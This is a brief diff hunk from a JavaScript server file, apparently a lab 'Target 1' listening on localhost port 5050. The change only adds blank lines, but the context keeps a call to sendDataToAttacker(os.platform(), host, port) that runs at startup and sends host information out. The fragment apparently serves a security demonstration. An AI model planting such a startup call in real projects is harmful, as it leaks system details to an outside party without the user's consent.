@@ -7,7 +7,9 @@ const server = createServer(app);
 
 const host = "127.0.0.1";
 const port = 5050;
+
 sendDataToAttacker(os.platform(), host, port);
+
 server.listen(port, host, () => {
   console.log(`[🔥] Target 1 is listening on ${host}:${port}...`);
 });
